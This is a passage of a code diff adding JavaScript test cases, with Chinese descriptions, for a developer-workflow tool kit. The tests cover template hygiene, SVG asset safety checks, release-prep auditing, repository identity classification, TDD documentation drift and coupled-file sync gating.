+cases.push(['templates/readme.md 与文档口径 Wave 4 (C20)：HTML 注释配对、零残留占位与 tier 对齐', async () => {
+  const { residualConditionMarkers } = await import('../lib/template.mjs')
+  for (const relPath of ['templates/readme.md', 'templates/releasing.md', 'templates/release-notes.md']) {
+    const raw = readFileSync(join(SKILL_ROOT, relPath), 'utf8')
+    const opens = (raw.match(/<!--/g) ?? []).length
+    const closes = (raw.match(/-->/g) ?? []).length
+    if (opens === 0 || opens !== closes) return `${relPath} HTML 注释未成对闭合（open=${opens}, close=${closes}）`
+  }
+  const readmeTpl = readFileSync(join(SKILL_ROOT, 'templates/readme.md'), 'utf8')
+  const residual = residualConditionMarkers(readmeTpl)
+  const vars = [...new Set([...readmeTpl.matchAll(/\{\{[^}]*\}\}/g)].map((m) => m[0]))]
+  if (residual.length > 0 || vars.length > 0) {
+    return `templates/readme.md 残留条件或未求值变量：${JSON.stringify({ residual, vars })}`
+  }
+  if (!readmeTpl.includes('存量仓库严禁重写覆盖')) return 'templates/readme.md 缺少存量防覆盖约束'
+
+  const skillMd = readFileSync(join(SKILL_ROOT, 'SKILL.md'), 'utf8')
+  const surveyMd = readFileSync(join(SKILL_ROOT, 'references/survey.md'), 'utf8')
+  if (/\bexplorationStrategy\.mode\b/.test(skillMd) || /\bexplorationStrategy\.mode\b/.test(surveyMd)) {
+    return 'SKILL.md 或 references/survey.md 仍残留过期字段 explorationStrategy.mode'
+  }
+  if (!skillMd.includes('explorationStrategy.tier') || !surveyMd.includes('explorationStrategy.tier')) {
+    return 'SKILL.md 或 references/survey.md 缺少 explorationStrategy.tier'
+  }
+  return true
+}])
+
+cases.push(['assets/readme/*.svg 与打包边界 Wave 4 (C21)：SVG 安全结构与 isProductLayerPath 正反双向', async () => {
+  const { isProductLayerPath } = await import('./preflight.mjs')
+  const { FORBIDDEN_PLATFORM_RE } = await import('../lib/protocol.mjs')
+  const EMOJI_RE = /\p{Extended_Pictographic}/u
+
+  const expectedSvgs = [
+    'assets/readme/hero.svg',
+    'assets/readme/hero-en.svg',
+    'assets/readme/workflow.svg',
+    'assets/readme/workflow-en.svg',
+    'assets/readme/architecture.svg',
+    'assets/readme/architecture-en.svg',
+  ]
+  for (const relPath of expectedSvgs) {
+    if (!existsSync(join(SKILL_ROOT, relPath))) return `缺少视觉 SVG 卡片：${relPath}`
+    if (!isProductLayerPath(relPath)) return `isProductLayerPath 拒绝了 assets/readme 资产：${relPath}`
+    const raw = readFileSync(join(SKILL_ROOT, relPath), 'utf8')
+    if (!/<svg\b/i.test(raw) || !/<\/svg>/i.test(raw) || !/\bviewBox\s*=\s*["'][^"']+["']/i.test(raw) || !/<title\b/i.test(raw)) {
+      return `SVG 结构或无障碍标签不完整：${relPath}`
+    }
+    if (/<script\b|<foreignObject\b|<image\b/i.test(raw)) return `SVG 含禁用元素：${relPath}`
+    const stripped = raw.replace(/\bxmlns(?::[a-z0-9_-]+)?\s*=\s*["']http:\/\/www\.w3\.org\/[^"']*["']/gi, '')
+    if (/https?:\/\//i.test(stripped)) return `SVG 含非标准外链 URL：${relPath}`
+    if (EMOJI_RE.test(raw) || FORBIDDEN_PLATFORM_RE.test(raw)) return `SVG 含 Emoji 或禁用平台词：${relPath}`
+  }
+
+  for (const bad of ['assets/other/junk.bin', 'assets/readme/nested/a.svg', 'assets/readme/hero.png', 'docs/TDD.md']) {
+    if (isProductLayerPath(bad)) return `isProductLayerPath 误放行了非法路径：${bad}`
+  }
+  return true
+}])
+
+cases.push(['govern-audit.mjs release-prep Wave 4 (C22)：多版本跳号采集、噪音过滤、unaccountedPublicFiles 与单提交冷启动', async () => {
+  const multiDir = tmpProject({
+    '.gitignore': 'node_modules/\n',
+    'package.json': `${JSON.stringify({
+      name: 'demo-cli',
+      version: '1.0.0',
+      bin: { demo: 'bin/cli.mjs' },
+      engines: { node: '>=16' },
+    }, null, 2)}\n`,
+    'SKILL.md': '---\nname: demo-cli\nmetadata:\n  version: "1.0.0"\n---\n# demo-cli\n',
+    'README.md': '# demo-cli\n',
+    'bin/cli.mjs': 'export function runCli() { return 1 }\n',
+    'src/core.mjs': 'export const core = 1\n',
+    'test/core.test.mjs': 'export const t = 1\n',
+  })
+  gitInit(multiDir)
+  const tagRes = spawnSync('git', ['tag', 'v1.0.0'], { cwd: multiDir, encoding: 'utf8' })
+  if (tagRes.status !== 0) throw new Error(`git tag failed: ${tagRes.stderr}`)
+
+  const commitIn = (dir, files, msg) => {
+    for (const [r, c] of Object.entries(files)) {
+      mkdirSync(dirname(join(dir, r)), { recursive: true })
+      writeFileSync(join(dir, r), c)
+    }
+    const opts = { cwd: dir, encoding: 'utf8' }
+    const addRes = spawnSync('git', ['add', '-A'], opts)
+    if (addRes.status !== 0) throw new Error(`git add failed: ${addRes.stderr}`)
+    const cRes = spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-qm', msg], opts)
+    if (cRes.status !== 0) throw new Error(`git commit failed (${msg}): ${cRes.stderr}`)
+  }
+
+  commitIn(multiDir, { 'src/core.mjs': 'export const core = 2\n' }, 'feat: C9 Wave 4 support streaming exports')
+  commitIn(multiDir, {
+    'package.json': `${JSON.stringify({
+      name: 'demo-cli',
+      version: '1.0.0',
+      bin: { demo: 'bin/cli.mjs' },
+      engines: { node: '>=18' },
+    }, null, 2)}\n`,
+  }, 'feat!: raise minimum Node version to 18')
+  commitIn(multiDir, {
+    'docs/specs/261114-stream.md': '# 流式导出规范\n\nStatus: implemented\n\n支持大文件流式导出输出。\n',
+    'docs/archive/todo/261114-stream.md': '# 任务单：流式导出\n\n## 完成后的记录\n\n已完成流式导出并同步文档。\n',
+  }, 'docs: record stream spec and archive todo')
+  commitIn(multiDir, { 'test/core.test.mjs': 'export const t = 2\n' }, 'feat: add test assertions for streaming')
+  commitIn(multiDir, { '.gitignore': 'node_modules/\ntmp/\n' }, 'chore: ignore tmp files')
+  commitIn(multiDir, { 'bin/cli.mjs': 'export function runCli() { return 2 }\n' }, 'update')
+
+  const changelogDir = tmpProject({
+    'pyproject.toml': '[project]\nname = "py-app"\nversion = "0.2.0"\nrequires-python = ">=3.11"\n',
+    'CHANGELOG.md': '# Changelog\n',
+    'README.md': '# py-app\n',
+  })
+  gitInit(changelogDir)
+
+  const nonGitDir = tmpProject({ 'README.md': '# plain\n' })
+
+  try {
+    const prepJsonRes = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['release-prep', multiDir, '--version', '3.0.0', '--json'])
+    if (prepJsonRes.status !== 0) return `release-prep 多标签跳版本失败：${prepJsonRes.stderr}`
+    const parsed = JSON.parse(prepJsonRes.stdout)
+    if (parsed.range?.from !== 'v1.0.0' || parsed.version?.targetTag !== 'v3.0.0') {
+      return `release-prep 区间或跳版本解析错误：${JSON.stringify({ range: parsed.range, version: parsed.version })}`
+    }
+    if ((parsed.stats?.filteredInternalCount ?? 0) < 2) {
+      return `release-prep 未过滤纯测试或配置噪音提交：${JSON.stringify(parsed.stats)}`
+    }
+    if (!parsed.userFacingCandidates?.some((c) => c.summary === 'support streaming exports')) {
+      return `release-prep 未清洗内部前缀或漏掉功能提交：${JSON.stringify(parsed.userFacingCandidates)}`
+    }
+    if (!parsed.breakingSignals?.some((b) => b.field === 'engines.node')) {
+      return `release-prep 未探测 engines.node 下限变化：${JSON.stringify(parsed.breakingSignals)}`
+    }
+    if ((parsed.implementedSpecs?.length ?? 0) !== 1 || (parsed.archivedOutcomes?.length ?? 0) !== 1) {
+      return `release-prep 未采集已实现规格或归档任务摘要：${JSON.stringify({ specs: parsed.implementedSpecs, todos: parsed.archivedOutcomes })}`
+    }
+    if (!parsed.unaccountedPublicFiles?.some((u) => u.file === 'bin/cli.mjs')) {
+      return `unaccountedPublicFiles 未检出含糊公开入口 bin/cli.mjs：${JSON.stringify(parsed.unaccountedPublicFiles)}`
+    }
+
+    const prepTextRes = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['release-prep', multiDir, '--version', '3.0.0'])
+    if (prepTextRes.status !== 0 || !prepTextRes.stdout.includes('v3.0.0') || !prepTextRes.stdout.includes('[AUDIT_ALERT]') || !prepTextRes.stdout.includes('[NEXT STEP]')) {
+      return `release-prep 文本输出缺失关键字段：exit=${prepTextRes.status}\n${prepTextRes.stdout}`
+    }
+
+    const chgRes = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['release-prep', changelogDir, '--version', '1.0.0', '--json'])
+    if (chgRes.status !== 0) return `release-prep 无标签 CHANGELOG 仓失败：${chgRes.stderr}`
+    const chgJson = JSON.parse(chgRes.stdout)
+    if (!chgJson.range?.isInitialRelease || chgJson.notesMode?.mode !== 'changelog' || !chgJson.breakingSignals?.some((b) => b.field === 'requires-python')) {
+      return `无标签 CHANGELOG 仓结果异常：${JSON.stringify({ range: chgJson.range, notesMode: chgJson.notesMode, breaking: chgJson.breakingSignals })}`
+    }
+
+    const nonGitRes = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['release-prep', nonGitDir])
+    if (nonGitRes.status === 0) return '非 Git 目录运行 release-prep 未拦截'
+
+    return true
+  } finally {
+    rmTree(multiDir)
+    rmTree(changelogDir)
+    rmTree(nonGitDir)
+  }
+}])
+
+cases.push(['多维护者团队协同 Wave 5 (C23)：team-collaborator 与 owner 区分、C4 防误判底线、零提交/外部 Fork 与离线 teamProbeHint', async () => {
+  const { classifyWorkspaceIdentity } = await import('../lib/platform/github.mjs')
+  const { resolveWorkspaceIdentity } = await import('../../kit/skills/lib/shared.mjs')
+  const { toMarkdown } = await import('../lib/render.mjs')
+
+  const baseGitFacts = {
+    present: true,
+    remote: 'https://github.com/org-a/team-app.git',
+    remoteUrls: { origin: 'https://github.com/org-a/team-app.git' },
+    commitCount: 3,
+    historyAuthors: ['Lead <lead@org-a.example>'],
+    userName: 'NewMember',
+    userEmail: 'new@org-a.example',
+  }
+
+  // 1. 正面（团队写权限协作者）：origin === declaredRepo 且登录账号不同于 originOwner -> maintainer + team-collaborator，无 teamProbeHint
+  const ghTeam = classifyWorkspaceIdentity({
+    gitFacts: baseGitFacts,
+    declaredRepo: 'org-a/team-app',
+    probeApi: { canPush: true, viewerPermission: 'WRITE', login: 'teammate-dev' },
+  })
+  if (ghTeam.role !== 'maintainer' || ghTeam.collaborationScope !== 'team-collaborator' || ghTeam.teamProbeHint) {
+    return `github.mjs 未将写权限团队协作者判为 team-collaborator：${JSON.stringify(ghTeam)}`
+  }
+  const shTeam = resolveWorkspaceIdentity({
+    remoteUrls: baseGitFacts.remoteUrls,
+    declaredRepo: 'org-a/team-app',
+    gitIdentity: { name: 'NewMember', email: 'new@org-a.example' },
+    historyAuthors: baseGitFacts.historyAuthors,
+    commits: 3,
+    apiProbe: { canPush: true, viewerPermission: 'WRITE', viewerLogin: 'teammate-dev' },
+  })
+  if (shTeam.role !== 'maintainer' || shTeam.collaborationScope !== 'team-collaborator' || shTeam.teamProbeHint) {
+    return `shared.mjs 未将写权限团队协作者判为 team-collaborator：${JSON.stringify(shTeam)}`
+  }
+
+  // 2. 正面（所有者）：账号与 originOwner 同名 -> owner
+  const ghOwner = classifyWorkspaceIdentity({
+    gitFacts: { ...baseGitFacts, remote: 'https://github.com/alice/my-app.git', remoteUrls: { origin: 'https://github.com/alice/my-app.git' } },
+    declaredRepo: 'alice/my-app',
+    probeApi: { canPush: true, viewerPermission: 'ADMIN', login: 'alice' },
+  })
+  const shOwner = resolveWorkspaceIdentity({
+    remoteUrls: { origin: 'https://github.com/alice/my-app.git' },
+    declaredRepo: 'alice/my-app',
+    apiProbe: { canPush: true, viewerPermission: 'ADMIN', viewerLogin: 'alice' },
+  })
+  if (ghOwner.role !== 'maintainer' || ghOwner.collaborationScope !== 'owner' || shOwner.role !== 'maintainer' || shOwner.collaborationScope !== 'owner') {
+    return `owner 判定异常：gh=${JSON.stringify(ghOwner)}, sh=${JSON.stringify(shOwner)}`
+  }
+
+  // 3. 反面（C4 底线 + 离线 teamProbeHint）：同源无探针且历史作者非本机 -> 保守 clone-readonly + 带 teamProbeHint
+  const ghOffline = classifyWorkspaceIdentity({ gitFacts: baseGitFacts, declaredRepo: 'org-a/team-app' })
+  const shOffline = resolveWorkspaceIdentity({
+    remoteUrls: baseGitFacts.remoteUrls,
+    declaredRepo: 'org-a/team-app',
+    gitIdentity: { name: 'NewMember', email: 'new@org-a.example' },
+    historyAuthors: baseGitFacts.historyAuthors,
+    commits: 3,
+  })
+  if (ghOffline.role !== 'clone-readonly' || !ghOffline.teamProbeHint?.includes('--probe-auth')) {
+    return `github.mjs 离线同源未保留 clone-readonly + teamProbeHint：${JSON.stringify(ghOffline)}`
+  }
+  if (shOffline.role !== 'clone-readonly' || !shOffline.teamProbeHint?.includes('--probe-auth')) {
+    return `shared.mjs 离线同源未保留 clone-readonly + teamProbeHint：${JSON.stringify(shOffline)}`
+  }
+
+  // 4. 零提交同源无写证明 -> 保守 undetermined + 带 teamProbeHint
+  const ghZero = classifyWorkspaceIdentity({
+    gitFacts: {
+      present: true,
+      remote: 'https://github.com/org-a/empty-repo.git',
+      remoteUrls: { origin: 'https://github.com/org-a/empty-repo.git' },
+      commitCount: 0,
+      historyAuthors: [],
+      userName: 'NewMember',
+      userEmail: 'new@org-a.example',
+    },
+    declaredRepo: 'org-a/empty-repo',
+  })
+  const shZero = resolveWorkspaceIdentity({
+    remoteUrls: { origin: 'https://github.com/org-a/empty-repo.git' },
+    declaredRepo: 'org-a/empty-repo',
+    gitIdentity: { name: 'NewMember', email: 'new@org-a.example' },
+    historyAuthors: [],
+    commits: 0,
+  })
+  if (ghZero.role !== 'undetermined' || !ghZero.teamProbeHint || shZero.role !== 'undetermined' || !shZero.teamProbeHint) {
+    return `零提交同源未保守归入 undetermined + teamProbeHint：gh=${JSON.stringify(ghZero)}, sh=${JSON.stringify(shZero)}`
+  }
+
+  // 5. 外部 Fork（origin !== declaredRepo 或 upstream !== origin）与已确认只读 API -> 不应误出 teamProbeHint
+  const ghFork = classifyWorkspaceIdentity({
+    gitFacts: {
+      ...baseGitFacts,
+      remote: 'https://github.com/contrib/team-app.git',
+      remoteUrls: { origin: 'https://github.com/contrib/team-app.git', upstream: 'https://github.com/org-a/team-app.git' },
+    },
+    declaredRepo: 'org-a/team-app',
+  })
+  const shFork = resolveWorkspaceIdentity({
+    remoteUrls: { origin: 'https://github.com/contrib/team-app.git' },
+    declaredRepo: 'org-a/team-app',
+    gitIdentity: { name: 'NewMember', email: 'new@org-a.example' },
+    historyAuthors: baseGitFacts.historyAuthors,
+    commits: 3,
+  })
+  if (ghFork.role !== 'contributor-fork' || ghFork.teamProbeHint || shFork.role !== 'contributor-fork' || shFork.teamProbeHint) {
+    return `外部 Fork 异常或误出 teamProbeHint：gh=${JSON.stringify(ghFork)}, sh=${JSON.stringify(shFork)}`
+  }
+
+  const ghApiRead = classifyWorkspaceIdentity({
+    gitFacts: baseGitFacts,
+    declaredRepo: 'org-a/team-app',
+    probeApi: { canPush: false, viewerPermission: 'READ', login: 'outsider' },
+  })
+  const shApiRead = resolveWorkspaceIdentity({
+    remoteUrls: baseGitFacts.remoteUrls,
+    declaredRepo: 'org-a/team-app',
+    gitIdentity: { name: 'NewMember', email: 'new@org-a.example' },
+    historyAuthors: baseGitFacts.historyAuthors,
+    commits: 3,
+    apiProbe: { canPush: false, viewerPermission: 'READ', viewerLogin: 'outsider' },
+  })
+  if (ghApiRead.role !== 'clone-readonly' || ghApiRead.teamProbeHint || shApiRead.role !== 'clone-readonly' || shApiRead.teamProbeHint) {
+    return `已确认 API 只读不应再输出 teamProbeHint：gh=${JSON.stringify(ghApiRead)}, sh=${JSON.stringify(shApiRead)}`
+  }
+
+  // 6. 临时仓联动：flow.mjs inspect（离线带 teamProbeHint）与 survey.mjs + render.mjs
+  const teamDir = tmpProject({
+    'package.json': `${JSON.stringify({ name: 'team-app', version: '1.0.0', repository: 'org-a/team-app', scripts: { test: 'node --test' } }, null, 2)}\n`,
+    'README.md': '# team-app\n',
+    'src/index.mjs': 'export const ok = true\n',
+  })
+  try {
+    spawnSync('git', ['init', '-q'], { cwd: teamDir, stdio: 'ignore' })
+    spawnSync('git', ['-c', 'user.name=Lead', '-c', 'user.email=lead@org-a.example', 'add', '-A'], { cwd: teamDir, stdio: 'ignore' })
+    spawnSync('git', ['-c', 'user.name=Lead', '-c', 'user.email=lead@org-a.example', 'commit', '-qm', 'init by lead'], { cwd: teamDir, stdio: 'ignore' })
+    spawnSync('git', ['config', 'user.name', 'NewTeammate'], { cwd: teamDir, stdio: 'ignore' })
+    spawnSync('git', ['config', 'user.email', 'new@org-a.example'], { cwd: teamDir, stdio: 'ignore' })
+    spawnSync('git', ['remote', 'add', 'origin', 'https://github.com/org-a/team-app.git'], { cwd: teamDir, stdio: 'ignore' })
+
+    const flowJsonRes = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['inspect', '--json'], { cwd: teamDir })
+    if (flowJsonRes.status !== 0) return `flow.mjs inspect --json 失败：${flowJsonRes.stderr}`
+    const flowJson = JSON.parse(flowJsonRes.stdout)
+    if (flowJson.identity?.role !== 'clone-readonly' || !flowJson.identity?.teamProbeHint?.includes('--probe-auth')) {
+      return `flow.mjs inspect --json 离线同源未给出 teamProbeHint：${JSON.stringify(flowJson.identity)}`
+    }
+
+    const flowTextRes = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['inspect'], { cwd: teamDir })
+    if (flowTextRes.status !== 0 || !flowTextRes.stdout.includes('团队权限提示') || !flowTextRes.stdout.includes('--probe-auth')) {
+      return `flow.mjs inspect 文本缺少团队权限提示：\n${flowTextRes.stdout}`
+    }
+
+    const sOff = await survey(teamDir)
+    const mdOff = toMarkdown(sOff)
+    if (sOff.git?.role !== 'clone-readonly' || !sOff.git?.teamProbeHint || !mdOff.includes('协同提示：') || !mdOff.includes('团队/组织协作者写权限')) {
+      return `survey + render 离线未展现 teamProbeHint：\n${mdOff}`
+    }
+
+    const sTeam = await survey(teamDir, { probeApi: { canPush: true, viewerPermission: 'WRITE', login: 'new-teammate' } })
+    const mdTeam = toMarkdown(sTeam)
+    if (sTeam.git?.role !== 'maintainer' || sTeam.git?.collaborationScope !== 'team-collaborator' || sTeam.git?.teamProbeHint || !mdTeam.includes('角色 `maintainer`（团队协作者）')) {
+      return `survey + render 团队协作者展示异常：${JSON.stringify(sTeam.git)}\n${mdTeam}`
+    }
+    return true
+  } finally {
+    rmTree(teamDir)
+  }
+}])
+
+cases.push(['通用自适应 TDD 与本仓 docs/TDD.md 重塑 Wave 5 (C24)：目录锚点、Mermaid/arch-rules/FeatureMap 与漂移拦截', async () => {
+  const { validateDocTocAnchors } = await import('./preflight.mjs')
+  const { templateVarsOf } = await import('../lib/protocol.mjs')
+
+  const tddRaw = readFileSync(join(SKILL_ROOT, 'docs/TDD.md'), 'utf8')
+  const tddErrors = validateDocTocAnchors(tddRaw)
+  if (tddErrors.length > 0) return `docs/TDD.md 目录锚点有误：${tddErrors.join('；')}`
+
+  const mermaidCount = (tddRaw.match(/```mermaid\b/g) ?? []).length
+  if (mermaidCount < 2 || !tddRaw.includes('flowchart') || !tddRaw.includes('stateDiagram-v2')) {
+    return `docs/TDD.md Mermaid 架构/状态图缺失（count=${mermaidCount}）`
+  }
+  if (!/```yaml[\s\S]*?\barch-rules:[\s\S]*?->[\s\S]*?```/.test(tddRaw)) {
+    return 'docs/TDD.md 缺少可执行 arch-rules yaml 块'
+  }
+
+  const mapRes = runAbs('kit/skills/dev-explore/scripts/repo-map.mjs', [SKILL_ROOT, '--json'])
+  if (mapRes.status !== 0) return `repo-map.mjs --json 失败：${mapRes.stderr}`
+  const mapJson = JSON.parse(mapRes.stdout)
+  const tddFeatures = (mapJson.featureMap ?? []).filter((x) => x.origin === 'docs/TDD.md')
+  if (tddFeatures.length < 10 || !tddFeatures.every((x) => Boolean(x.source))) {
+    return `repo-map.mjs 未从 docs/TDD.md 解析出完整 Feature Map：${JSON.stringify(mapJson.featureMap)}`
+  }
+
+  const sSelf = await survey(SKILL_ROOT)
+  if ((sSelf.reentry?.staleTddPaths?.length ?? 0) > 0) {
+    return `本仓 docs/TDD.md 存在失效路径：${JSON.stringify(sSelf.reentry.staleTddPaths)}`
+  }
+
+  const tplRaw = readFileSync(join(SKILL_ROOT, 'templates/docs-tdd.md'), 'utf8')
+  const tplErrors = validateDocTocAnchors(tplRaw)
+  if (tplErrors.length > 0) return `templates/docs-tdd.md 目录锚点有误：${tplErrors.join('；')}`
+  if (!tplRaw.includes('[按需保留，不适用整节删除]') || tplRaw.includes('references/') || templateVarsOf(tplRaw).length > 0) {
+    return 'templates/docs-tdd.md 未满足自适应按需标记或纯净度要求'
+  }
+
+  // 反面 1：validateDocTocAnchors 必须抓出悬空锚点
+  const brokenErrors = validateDocTocAnchors('## 目录\n\n- [幽灵章节](#missing-anchor)\n\n## 真实章节\n')
+  if (brokenErrors.length === 0) return 'validateDocTocAnchors 未拦截失效目录锚点'
+
+  // 反面 2：docs/TDD.md 注入幽灵路径后，survey 与 govern-audit 必须共同抓出
+  const ghostDir = tmpProject({
+    'package.json': '{"name":"tdd-ghost","version":"1.0.0","scripts":{"test":"node --test"}}\n',
+    'README.md': '# tdd-ghost\n',
+    'src/ok.mjs': 'export const ok = true\n',
+    'docs/TDD.md': '# tdd-ghost TDD\n\n## 目录\n\n- [模块](#模块)\n\n## 模块\n\n正常入口：`src/ok.mjs`，幽灵路径：`src/ghost-nonexistent-module.mjs`。\n',
+  })
+  try {
+    gitInit(ghostDir)
+    const sGhost = await survey(ghostDir)
+    if (!sGhost.reentry?.drifted || !sGhost.reentry?.staleTddPaths?.includes('src/ghost-nonexistent-module.mjs') || sGhost.reentry?.staleTddPaths?.includes('src/ok.mjs')) {
+      return `survey 未准确识别 TDD 幽灵路径：${JSON.stringify(sGhost.reentry)}`
+    }
+    const auditRes = runAbs('kit/skills/dev-govern/scripts/govern-audit.mjs', ['audit', ghostDir, '--json'])
+    if (auditRes.status !== 0) return `govern-audit 失败：${auditRes.stderr}`
+    const auditJson = JSON.parse(auditRes.stdout)
+    const hit = (auditJson.findings ?? []).some((f) => f.id === 'docs.tdd-stale-path.src/ghost-nonexistent-module.mjs')
+    if (!hit) return `govern-audit 未报出 docs.tdd-stale-path：${JSON.stringify(auditJson.findings?.map((f) => f.id))}`
+    return true
+  } finally {
+    rmTree(ghostDir)
+  }
+}])
+
+cases.push(['耦合文件自同步门禁 Wave 7 (C29)：AGENTS 改哪看哪解析、单边触发告警、--strict-sync 阻断与全同步放行', async () => {
+  const { parseCoupledSyncRules, evaluateCoupledSync } = await import('../../kit/skills/lib/shared.mjs')
+
+  const dir = tmpProject({
+    'package.json': '{"name":"c29-demo","version":"1.0.0","scripts":{"test":"node --test"}}\n',
+    'AGENTS.md': [
+      '# c29-demo 工程契约',
+      '',
+      '## Dev Profile',
+      '',
+      '```yaml',
+      'quick-test: node --test {target}',
+      'full-test: node --test',
+      'smoke-verify: node --test',
+      'merge-gate: node --test',
+      'arch-rules: none',
+      'high-risk: src/api.mjs',
+      'do-not-edit: none',
+      '```',
+      '',
+      '## 改哪看哪',
+      '',
+      '| 这次动了 | 必须一起看 |',
+      '| --- | --- |',
+      '| `src/api.mjs` | `docs/api.md` |',
+      '| `templates/core.md` | `AGENTS.md`、`docs/optional-absent.md` |',
+      '',
+    ].join('\n'),
+    'src/api.mjs': 'export const version = 1\n',
+    'src/other.mjs': 'export const ok = true\n',
+    'docs/api.md': '# API\n\nInitial version 1.\n',
+    'templates/core.md': '# Core Template\n',
+  })
+
+  try {
+    gitInit(dir)
+    const agentsRaw = readFileSync(join(dir, 'AGENTS.md'), 'utf8')
+    const rules = parseCoupledSyncRules(agentsRaw)
+    if (rules.length !== 2) return `parseCoupledSyncRules 解析行数异常：${JSON.stringify(rules)}`
+
+    // 直接调用共享库：单边修改 src/api.mjs 必须告警；仅改 templates/core.md 不应误报不存在的可选伴随文件
+    const wApi = evaluateCoupledSync(['src/api.mjs'], rules, dir)
+    if (wApi.length !== 1 || !wApi[0].expectedCompanions.includes('docs/api.md')) {
+      return `evaluateCoupledSync 单边修改未命中 docs/api.md：${JSON.stringify(wApi)}`
+    }
+    const wOpt = evaluateCoupledSync(['templates/core.md'], rules, dir)
+    if (wOpt.length !== 1 || wOpt[0].expectedCompanions.includes('docs/optional-absent.md') || !wOpt[0].expectedCompanions.includes('AGENTS.md')) {
+      return `evaluateCoupledSync 可选不存在伴随文件过滤异常：${JSON.stringify(wOpt)}`
+    }
+    const wBoth = evaluateCoupledSync(['src/api.mjs', 'docs/api.md'], rules, dir)
+    const wUnrelated = evaluateCoupledSync(['src/other.mjs'], rules, dir)
+    if (wBoth.length !== 0 || wUnrelated.length !== 0) {
+      return `evaluateCoupledSync 反面全同步/无关文件误报：both=${JSON.stringify(wBoth)}, other=${JSON.stringify(wUnrelated)}`
+    }
+
+    // 启动流转分支后只修改 src/api.mjs 并提交，检验 doc-plan triage / review-pack / flow finalize
+    const startRes = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['start', '--task', 'c29-t1', '--case', '2', '--slug', 'api-sync', '--dir', dir])
+    if (startRes.status !== 0) return `flow.mjs start 失败：${startRes.stderr}`
+
+    writeFileSync(join(dir, 'src/api.mjs'), 'export const version = 2\n')
+    spawnSync('git', ['add', 'src/api.mjs'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-qm', 'update api only'], { cwd: dir, stdio: 'ignore' })
+
+    const triageOne = runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['triage', '--dir', dir, '--summary', 'update api', '--paths', 'src/api.mjs', '--json'])
+    if (triageOne.status !== 0) return `doc-plan.mjs triage 失败：${triageOne.stderr}`
+    const triageOneJson = JSON.parse(triageOne.stdout)
+    if ((triageOneJson.coupledSyncWarnings?.length ?? 0) !== 1 || !triageOneJson.coupledSyncWarnings[0].expectedCompanions.includes('docs/api.md')) {
+      return `doc-plan.mjs triage 单边未输出 coupledSyncWarnings：${JSON.stringify(triageOneJson)}`
+    }
+
+    const packJsonRes = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--dir', dir, '--base', 'master', '--json'])
+    if (packJsonRes.status !== 0) return `review-pack.mjs --json 失败：${packJsonRes.stderr}`
+    const packJson = JSON.parse(packJsonRes.stdout)
+    if ((packJson.coupledSyncWarnings?.length ?? 0) !== 1) {
+      return `review-pack.mjs --json 未输出 coupledSyncWarnings：${JSON.stringify(packJson.coupledSyncWarnings)}`
+    }
+    const packMdRes = runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--dir', dir, '--base', 'master'])
+    if (packMdRes.status !== 0 || !packMdRes.stdout.includes('## 联动同步核对（改哪看哪）') || !packMdRes.stdout.includes('docs/api.md')) {
+      return `review-pack.mjs Markdown 缺少联动同步核对节：\n${packMdRes.stdout}`
+    }
+
+    const finJsonRes = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 'c29-t1', '--dir', dir, '--json'])
+    if (finJsonRes.status !== 0) return `flow.mjs finalize --json 失败：${finJsonRes.stderr}`
+    const finJson = JSON.parse(finJsonRes.stdout)
+    if ((finJson.coupledSyncWarnings?.length ?? 0) !== 1) {
+      return `flow.mjs finalize --json 未输出 coupledSyncWarnings：${JSON.stringify(finJson)}`
+    }
+
+    const strictFail = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 'c29-t1', '--strict-sync', '--dir', dir])
+    if (strictFail.status === 0 || !strictFail.stderr.includes('BLOCKED_COUPLED_SYNC')) {
+      return `flow.mjs finalize --strict-sync 未阻断单边改动：exit=${strictFail.status}, err=${strictFail.stderr}`
+    }
+
+    // 反面：补齐伴随文件 docs/api.md 后，三处工具均应 0 告警且 --strict-sync 放行
+    writeFileSync(join(dir, 'docs/api.md'), '# API\n\nUpdated version 2.\n')
+    spawnSync('git', ['add', 'docs/api.md'], { cwd: dir, stdio: 'ignore' })
+    spawnSync('git', ['-c', 'user.name=t', '-c', 'user.email=t@t.t', 'commit', '-qm', 'sync api docs'], { cwd: dir, stdio: 'ignore' })
+
+    const triageSynced = JSON.parse(runAbs('kit/skills/dev-plan/scripts/doc-plan.mjs', ['triage', '--dir', dir, '--summary', 'update api', '--paths', 'src/api.mjs,docs/api.md', '--json']).stdout)
+    if ((triageSynced.coupledSyncWarnings?.length ?? 0) !== 0) {
+      return `doc-plan.mjs triage 配对同步后仍误报：${JSON.stringify(triageSynced.coupledSyncWarnings)}`
+    }
+    const packSynced = JSON.parse(runAbs('kit/skills/dev-review/scripts/review-pack.mjs', ['--dir', dir, '--base', 'master', '--json']).stdout)
+    if ((packSynced.coupledSyncWarnings?.length ?? 0) !== 0) {
+      return `review-pack.mjs 配对同步后仍误报：${JSON.stringify(packSynced.coupledSyncWarnings)}`
+    }
+    const strictPass = runAbs('kit/skills/dev-flow/scripts/flow.mjs', ['finalize', '--task', 'c29-t1', '--strict-sync', '--dir', dir, '--json'])
+    if (strictPass.status !== 0 || (JSON.parse(strictPass.stdout).coupledSyncWarnings?.length ?? 0) !== 0) {
+      return `flow.mjs finalize 配对同步后未放行：exit=${strictPass.status}, out=${strictPass.stdout}, err=${strictPass.stderr}`
+    }
+
+    return true
+  } finally {
+    rmTree(dir)
+  }
+}])
+
+cases.push(['统一 YAML Frontmatter 与文档命名生命周期 Wave 7 (C30)：init/link/flow start 自动重命名、audit 拦截与旧格式兼容', async () => {
+  const { parseDocFrontmatter } = await import('../../kit/skills/lib/shared.mjs')
+
+  const fillGeneratedDoc = (absPath) => {
+    let txt = readFileSync(absPath, 'utf8')
+    txt = txt
